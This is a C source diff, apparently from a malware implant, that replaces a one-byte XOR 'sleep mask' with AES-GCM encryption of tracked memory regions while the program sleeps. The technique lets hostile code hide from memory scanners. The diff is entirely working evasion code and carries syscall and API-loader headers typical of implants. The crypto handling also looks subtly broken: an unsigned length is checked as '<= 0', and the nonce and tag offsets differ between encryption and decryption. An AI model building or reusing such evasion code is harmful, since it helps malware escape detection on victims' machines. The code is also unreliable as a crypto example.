@@ -1,22 +1,24 @@
 #include "WaitMask.h"
 #include "Syscalls.h"
 #include "ApiLoader.h"
+#include "Crypt.h"
+#include "utils.h"
 
 #define MAX_SLEEP_REGIONS 128
 static PVOID g_SleepRegions[MAX_SLEEP_REGIONS];
 static SIZE_T g_SleepRegionSizes[MAX_SLEEP_REGIONS];
 static int g_SleepRegionCount = 0;
-static BYTE g_XorKey = 0;
+static BYTE g_SleepKey[16];
 
 void SleepObfInit()
 {
-	g_XorKey = (BYTE)(GenerateRandom32() & 0xFF);
-	if (g_XorKey == 0) g_XorKey = 0xAA;
+	for (int i = 0; i < 16; i++)
+		g_SleepKey[i] = (BYTE)(GenerateRandom32() & 0xFF);
 }
 
 void SleepObfTrackRegion(PVOID addr, SIZE_T size)
 {
-	if (g_SleepRegionCount < MAX_SLEEP_REGIONS) {
+	if (g_SleepRegionCount < MAX_SLEEP_REGIONS && size > (SIZE_T)(GCM_NONCE_SIZE + GCM_TAG_SIZE)) {
 		g_SleepRegions[g_SleepRegionCount] = addr;
 		g_SleepRegionSizes[g_SleepRegionCount] = size;
 		g_SleepRegionCount++;
@@ -25,17 +27,50 @@ void SleepObfTrackRegion(PVOID addr, SIZE_T size)
 
 static void SleepEncrypt()
 {
+	if (g_SleepRegionCount == 0) return;
+
+	BYTE nonce[GCM_NONCE_SIZE];
+	BYTE tag[GCM_TAG_SIZE];
+	unsigned char* buf = NULL;
+
 	for (int i = 0; i < g_SleepRegionCount; i++) {
 		PBYTE p = (PBYTE)g_SleepRegions[i];
 		SIZE_T sz = g_SleepRegionSizes[i];
-		for (SIZE_T j = 0; j < sz; j++)
-			p[j] ^= g_XorKey;
+		SIZE_T plainLen = sz - GCM_NONCE_SIZE - GCM_TAG_SIZE;
+
+		if (plainLen <= 0) continue;
+
+		buf = (unsigned char*)MemAllocLocal(sz);
+		if (!buf) continue;
+		memcpy(buf, p, sz);
+
+		AESGCMEncrypt(buf, plainLen, g_SleepKey, buf, buf + GCM_NONCE_SIZE, buf + GCM_NONCE_SIZE + plainLen);
+		memcpy(p, buf, sz);
+		MemFreeLocal((LPVOID*)&buf, sz);
 	}
 }
 
 static void SleepDecrypt()
 {
-	SleepEncrypt();
+	if (g_SleepRegionCount == 0) return;
+
+	unsigned char* buf = NULL;
+
+	for (int i = 0; i < g_SleepRegionCount; i++) {
+		PBYTE p = (PBYTE)g_SleepRegions[i];
+		SIZE_T sz = g_SleepRegionSizes[i];
+		SIZE_T plainLen = sz - GCM_NONCE_SIZE - GCM_TAG_SIZE;
+
+		if (plainLen <= 0) continue;
+
+		buf = (unsigned char*)MemAllocLocal(plainLen);
+		if (!buf) continue;
+
+		if (AESGCMDecrypt(p, plainLen, g_SleepKey, p, buf, p + sz - GCM_TAG_SIZE)) {
+			memcpy(p, buf, plainLen);
+		}
+		MemFreeLocal((LPVOID*)&buf, plainLen);
+	}
 }
 
 void mySleep(ULONG ms) 
